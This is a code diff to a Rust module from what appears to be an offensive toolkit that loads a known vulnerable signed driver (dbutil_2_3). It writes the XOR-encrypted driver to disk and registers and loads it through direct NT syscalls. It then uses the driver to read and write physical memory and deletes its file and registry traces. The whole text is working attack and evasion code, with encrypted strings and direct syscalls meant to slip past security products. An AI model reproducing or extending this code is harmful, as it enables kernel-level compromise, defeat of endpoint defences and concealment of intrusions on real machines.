@@ -6,7 +6,7 @@
 //! 3. Loading the driver via NtLoadDriver (creates registry service entry)
 //! 4. Post-load cleanup: file deletion, obtaining device handles
 //!
-//! All NT API calls go through `nt_syscall::syscall!`.
+//! All NT API calls go through `syscall!`.
 //! All strings through `string_crypt`.
 
 use super::driver_db::{self, DriverMapping, VulnerableDriver};
@@ -154,7 +154,7 @@ pub fn scan_for_loaded_driver(preferred: &[String]) -> Result<Option<&'static Vu
 
     // First call to get required buffer size.
     unsafe {
-        let status = nt_syscall::syscall!(
+        let status = syscall!(
             "NtQuerySystemInformation",
             SYSTEM_MODULE_INFORMATION,
             base_addr as *mut u8,
@@ -174,7 +174,7 @@ pub fn scan_for_loaded_driver(preferred: &[String]) -> Result<Option<&'static Vu
     let mut return_length: u32 = 0;
 
     let status = unsafe {
-        nt_syscall::syscall!(
+        syscall!(
             "NtQuerySystemInformation",
             SYSTEM_MODULE_INFORMATION,
             buffer.as_mut_ptr(),
@@ -347,10 +347,20 @@ pub fn deploy_embedded_driver(
 static EMBEDDED_DRIVER_BYTES: &[u8] =
     include_bytes!("../../resources/placeholder_driver.xor");
 
-/// When the `embedded_driver` feature is set, the builder provides the
-/// actual encrypted driver bytes via an environment variable at build time.
+/// When the `embedded_driver` feature is enabled, the builder MUST set the
+/// `ORCHESTRA_DRIVER_PATH` environment variable at compile time to point to the
+/// XOR-encrypted vulnerable driver file.  Example:
+///
+/// ```sh
+/// ORCHESTRA_DRIVER_PATH=resources/drivers/dbutil_2_3_xor_encrypted.bin \
+///     cargo build --features embedded_driver
+/// ```
+///
+/// If the variable is not set, compilation will fail with an
+/// `include_bytes!` error — this is intentional (fail-fast at build time
+/// rather than silently embedding an empty payload).
 #[cfg(feature = "embedded_driver")]
-static EMBEDDED_DRIVER_BYTES: &[u8] = &[];
+static EMBEDDED_DRIVER_BYTES: &[u8] = include_bytes!(env!("ORCHESTRA_DRIVER_PATH"));
 
 /// Get the embedded (XOR-encrypted) bytes for a driver.
 ///
@@ -365,6 +375,14 @@ fn get_embedded_driver_bytes(driver: &VulnerableDriver) -> Vec<u8> {
     if !is_embedded {
         log::debug!(
             "No embedded resource for {} (not a Tier 1 driver)",
+            driver.name
+        );
+        return Vec::new();
+    }
+
+    if EMBEDDED_DRIVER_BYTES.is_empty() {
+        log::warn!(
+            "Embedded driver bytes are empty for {}. Set ORCHESTRA_DRIVER_PATH at build time.",
             driver.name
         );
         return Vec::new();
@@ -405,7 +423,7 @@ fn write_driver_to_disk(path: &str, data: &[u8]) -> Result<()> {
     //   ULONG              EaLength           // 11 — 0
     // )
     let status = unsafe {
-        nt_syscall::syscall!(
+        syscall!(
             "NtCreateFile",
             &mut handle as *mut usize as u64,       // 1
             0x40000000u64,                           // 2 — GENERIC_WRITE
@@ -428,7 +446,7 @@ fn write_driver_to_disk(path: &str, data: &[u8]) -> Result<()> {
     // Write the data via NtWriteFile.
     let mut write_iosb = IoStatusBlock::default();
     let status = unsafe {
-        nt_syscall::syscall!(
+        syscall!(
             "NtWriteFile",
             handle as u64,                           // FileHandle
             0u64,                                    // Event
@@ -443,7 +461,7 @@ fn write_driver_to_disk(path: &str, data: &[u8]) -> Result<()> {
     };
 
     // Close the file handle.
-    let _ = unsafe { nt_syscall::syscall!("NtClose", handle as u64) };
+    let _ = unsafe { syscall!("NtClose", handle as u64) };
 
     if status != 0 {
         bail!("NtWriteFile for driver failed: 0x{:08X}", status);
@@ -477,7 +495,7 @@ fn load_driver_via_registry(
     let mut disp: u32 = 0;
 
     let status = unsafe {
-        nt_syscall::syscall!(
+        syscall!(
             "NtCreateKey",
             &mut key_handle as *mut usize as u64,
             0x000F003Fu64, // KEY_ALL_ACCESS
@@ -511,14 +529,14 @@ fn load_driver_via_registry(
     let mut load_uni = make_unicode_string(&mut load_path_wide);
 
     let status = unsafe {
-        nt_syscall::syscall!(
+        syscall!(
             "NtLoadDriver",
             &mut load_uni as *mut _ as u64
         )
     };
 
     // Close the registry key.
-    let _ = unsafe { nt_syscall::syscall!("NtClose", key_handle as u64) };
+    let _ = unsafe { syscall!("NtClose", key_handle as u64) };
 
     if status != 0 {
         // Clean up the registry key on failure.
@@ -538,7 +556,7 @@ fn set_registry_dword(key_handle: usize, value_name: &str, value: u32) -> Result
     let mut uni_name = make_unicode_string(&mut name_wide);
 
     let status = unsafe {
-        nt_syscall::syscall!(
+        syscall!(
             "NtSetValueKey",
             key_handle as u64,
             &mut uni_name as *mut _ as u64,
@@ -568,7 +586,7 @@ fn set_registry_string(key_handle: usize, value_name: &str, value: &str) -> Resu
     let data_size = value_wide.len() as u64 * 2 + 2; // Include null terminator
 
     let status = unsafe {
-        nt_syscall::syscall!(
+        syscall!(
             "NtSetValueKey",
             key_handle as u64,
             &mut uni_name as *mut _ as u64,
@@ -599,15 +617,15 @@ fn delete_registry_key(path: &str) {
     let mut key_handle: usize = 0;
 
     unsafe {
-        let status = nt_syscall::syscall!(
+        let status = syscall!(
             "NtOpenKey",
             &mut key_handle as *mut usize as u64,
             0x00020019u64, // KEY_WRITE | DELETE
             &mut oa as *mut _ as u64
         );
         if status == 0 {
-            let _ = nt_syscall::syscall!("NtDeleteKey", key_handle as u64);
-            let _ = nt_syscall::syscall!("NtClose", key_handle as u64);
+            let _ = syscall!("NtDeleteKey", key_handle as u64);
+            let _ = syscall!("NtClose", key_handle as u64);
         }
     }
 }
@@ -625,7 +643,7 @@ fn delete_file_from_disk(path: &str) -> Result<()> {
     let mut oa = ObjectAttributes::new(&mut uni_name);
 
     let status = unsafe {
-        nt_syscall::syscall!(
+        syscall!(
             "NtDeleteFile",
             &mut oa as *mut _ as u64
         )
@@ -656,7 +674,7 @@ fn open_driver_device(driver: &VulnerableDriver) -> Result<usize> {
     let mut handle: usize = 0;
 
     let status = unsafe {
-        nt_syscall::syscall!(
+        syscall!(
             "NtOpenFile",
             &mut handle as *mut usize as u64,
             (0x00100000u64 | 0x00020000u64), // SYNCHRONIZE | FILE_READ_DATA
@@ -709,7 +727,7 @@ pub unsafe fn read_physical_memory(
             //   PVOID           OutputBuffer,     // 9
             //   ULONG           OutputBufferLength// 10
             // )
-            let status = nt_syscall::syscall!(
+            let status = syscall!(
                 "NtDeviceIoControlFile",
                 device_handle as u64,                      // 1
                 0u64,                                      // 2 — Event
@@ -762,7 +780,7 @@ pub unsafe fn write_physical_memory(
 
             let mut iosb = IoStatusBlock::default();
 
-            let status = nt_syscall::syscall!(
+            let status = syscall!(
                 "NtDeviceIoControlFile",
                 device_handle as u64,                      // 1
                 0u64,                                      // 2 — Event
@@ -803,7 +821,7 @@ pub unsafe fn cleanup_driver() -> Result<()> {
     if let Some(deployed) = guard.take() {
         // Close device handle.
         if let Some(handle) = deployed.device_handle {
-            let _ = nt_syscall::syscall!("NtClose", handle as u64);
+            let _ = syscall!("NtClose", handle as u64);
         }
 
         // Delete the registry service entry.
